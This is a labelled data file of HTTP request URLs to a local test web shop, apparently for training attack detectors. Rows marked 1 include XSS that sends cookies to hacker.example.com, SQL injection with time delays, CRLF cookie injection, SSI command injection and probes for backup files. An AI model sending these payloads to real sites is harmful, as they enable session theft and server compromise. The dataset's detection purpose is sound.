"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = rygwalsk & password = ve50able & nombre = francisco & apellidos = pallares + milara % 00 & email = gozzi @ encuentrodominios . at & dni = 51556666g & direccion = pl .  + banco + 196 ,  + 7g & ciudad = corrales & cp = 03187 & provincia = la + rioja & ntc = 3169451354292215 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = yong & password = supurativa & nombre = rodecinda & apellidos = tobía + bolaños & email = labreche . wolf @ lodgemadrid . sr & dni = 09294742m & direccion = passeig + salze + 72 ,  + 3 - a & ciudad = lobón & cp = 46119 & provincia = madrid & ntc = 2767737308200110 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 3690 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9073 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = kwok - lan4 & pwd = a8q6isici81 & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = arina & password = ácueo & nombre = gertrudis & apellidos = posada + solero & email = lepetic @ cursosenlaplaya . do & dni = 50590690m & direccion = tomas + crespo ,  + 39 ,  + 8b & ciudad = palacios + del + sil & cp = 08770 & provincia = alicante & ntc = 0640306844862219 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = souba & password = duomesina & nombre = macedonia & apellidos = paul ? lada /  + subir ? ana & email = motaung @ hojainformativas . com . ee & dni = 71823012s & direccion = c /  + el + rubio ,  + 155 ,  +  & ciudad = ciempozuelos & cp = 13100 & provincia = la + rioja & ntc = 9142922555236896 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = pringle & pwd = genro & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = maher & password = ca922839alo & nombre = indira & apellidos = ludeñas + lopez & email = hessling @ mundoapple . kw & dni = 67332763x & direccion = c /  + sagrado + corazon + 26 + 5e & ciudad = arroyomolinos & cp = 15076 & provincia = navarra & ntca = 8289412195885989 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 220 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = queso + manchego & precio = 39 & cantidad = 86 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / miembros / salir . jsp / 6909030637832563290 . jsp . inc,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2714 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 100 & cantidad = 24 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4935 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = bayne & password = 05st1fo05 & nombre = niseas & apellidos = obrist + huaripata & email = cederborg @ minavit . um & dni = 58171887b & direccion = c /  + calañas + 123 ,  +  & ciudad = quiñonería & cp = 35539 & provincia = cáceres & ntc = 2015784744450329 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2157 & b1 = confirmar,0
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = nady & password = 9va3831 & nombre = shirley & apellidos = urbaez + mariangel & email = erlich - jarrel @ modeloscaninos . ni & dni = 39759775c & direccion = algarrobo + 197 + 3 ? f & ciudad = navalonguilla & cp = 0379a & provincia = segovia & ntc = 5083698855321760 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = nabeel & pwd = vanidosa & remember = on & b1 = paros % 22 + style % 3d % 22background % 3aurl % 28javascript % 3aalert % 28 % 27paros % 27 % 29 % 29 & id = 2,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = kasbia7 & password = v1jar & nombre = fiorella & apellidos = miralles + casola & email = donell @ caspospas . bh & dni = 84634236d & direccion = jorge + manrique ,  + 113 ,  + 12 ? g & ciudad = arbeteta & cp = 46611 & provincia = cáceres & ntc = 1272948221132397 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / 4861362529278789730 . old,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8036 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 100 & cantidad = 88 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón '  + ibéric -  ' o & precio = 100 & cantidad = 30 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = zolly & pwd = i - nsípido & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = nabeel & pwd = vanidosa & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6972 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4377 & b1 = confirmar,0
localhost : 8080 / cfide / administrator / header . cfm,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 33 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1216 & b1 = any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 39 & cantidad = 92 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 157 & b1a = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 60 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = credenciales + incorrectasany % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = coloads & pwd = riosellano & remember = on /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precioa = 39 & cantidad = 90 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / imagenes / 4861362529278789730 . old,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 350 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & precio = 4762 & b1 = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = earlene & password = velador & nombre = eberto & apellidos = balsas + varillas & email = jeomans - diniz @ fbi - criminal - network . com . pro & dni = 38821081w & direccion = avda .  + de + manuel + llaneza ,  + 167 ,  +  & ciudad = espiel & cp = 49580 & provincia = a + coruña & ntc = 6076630443152163 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = vino + rioja & precio = 100 & cantidad = 61 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = soucy2 & pwd = definible & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = robbie & password = 7nexor40ilidad & nombre = milet & apellidos = alles + araujo & email = adix _ adam @ easyviaggio . com . km & dni = 56876585t & direccion = calle + juan + montilla ,  + 50 + 1 - a & ciudad = paterna & cp = 1949a & provincia = navarra & ntc = 9173328900592385 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 49 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9498 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & b1 = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = tetsuyuk & password = po * laridad & nombre = keren & apellidos = gabàs & email = trieste @ sitienesunawebtienesunnegocio . ad & dni = 78497070w & direccion = c /  + escultor + nicolas + de + bussi ,  + 65 +  & ciudad = bakaiku & cp = 10910 & provincia = barcelona & ntc = 7233074673083306 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7092 & b1 = confirmarany % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón '  + ibéric -  ' o & precio = 85 & cantidad = 57 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = brade & password = 72ler5 & nombre = leticia & apellidos = esteve + portas & email = arledge - berleand @ magadan . com . np & dni = 56249711z & direccion = calle + barrio + de + las + alamedillas + 101 ,  +  & ciudad = deltebre & cp = 40216 & provincia = tarragona & ntc = 4105105461305376 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = goldstei & pwd = exp8a1!a6a & remember = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = lorrayne & password = anofele6 & nombre = neliana & apellidos = monllor + mascort & email = tsaganeas @ mccomptables . my & dni = 26431261y & direccion = calle + begonia + 47 ,  +  & ciudad = recuenco ,  + el & cp = 44168 & provincia = guad ? ala / jar ? a & ntc = 7168408229054610 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  & nombre = jamón + ibérico & precio = 39 & cantidad = 78 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = mignonne & password = desen8alin0ar & nombre = geraldo & apellidos = zurdo & email = nolan @ lesionesmusculares . aw & dni = 48159318d & direccion = lugar + outeiro + 124 + 11 - d & ciudad = vilardevós & cp = 19180 & provincia = granada & ntc = 1899475153480936 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = kip & password = t1padero & nombre = francis & apellidos = villagrà & email = chailles6 @ miami - beach . com . cs & dni = 95222837p & direccion = pujada + primer + de + maig ,  + 171 +  & ciudad = benahavís & cp = 08585 & provincia = burgos & ntc = 7583130672386315 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = fatica & pwd = preconizac!ión & remembera = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1447 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2787 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = gerhart6 & password = bote!llón & nombre = imperio & apellidos =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & email = nadiuska . tolan @ icodea . cf & dni = 91508719e & direccion = calle + valencia + 113 ,  +  & ciudad = alzira & cp = 16235 & provincia = cuenca & ntc = 2085971217083634 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / carrito . jsp / asf - logo - wide . gif . bak,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = adornato & password = politiquería & nombre = fedelia & apellidos = ollero + sogorb & email = andreas6 @  @ fest - tv . a @ o & dni = 43658270s & direccion = c /  + guincho ,  + 191 ,  + 7 ? f & ciudad = abezames & cp = 12230 & provincia = la + rioja & ntc = 4001707460771803 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 3714 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = cottengi & password = apendicul9r & nombre = amiel & apellidos = ponsatí + lemunao & email = innis . yarbrough @ fuzzy . kz & dni = 80966763r & direccion = calle + juan + duque + 169 + 4 ? d & ciudad = guadalix + de + la + sierra & cp = 17475 & provincia = castellón & ntc = 4315753990410491 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 3 & b1 = añadir + al + carrito @ 40,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 100 & cantidad = 68 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 100 & cantidad = 64 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1199 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 85 & cantidad = 86 ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  <  & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = eluned & pwd = p8pah7g6 & remember = on & b1 = entrarany % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727,1
localhost : 8080 / tienda1 / publico / vaciar . jspb2 =  @ 40,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = tetsuo & password = a $ cuátil & nombre = janina & apellidos = corado + bonías & email = bienvenu - goz @ carmensanmartin . lv & dni = 48475570b & direccion = especias ,  + 58 ,  + 12c & ciudad = valdeavellano & cp = 09560 & provincia = toledo & ntc = 8452706434058820 & b1a = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio =  |  & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = goldner & pwd = 3988p5e1t4 & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = saeed & pwd = 8eferé9dum & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9224 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 2709 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 464 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = vino + rioja & precio = 85 & cantidad = 35 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / imagenes / cmenbul . gif / 6909030637832563290 . jsp . old,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 4 & b1 = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script > ,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = grueng & password = ma * guillo & nombre = amar - ilis & apellidos = febo + derch & email = hollen _ farber @ bacoespecialselección . bu & dni = 71766334d & direccion = calle + ruiseñor + 34 +  & ciudad = moreda + de + álava & cp = 10374 & provincia = segovia & ntc = 2753265172656734 & b1 = registrar,1
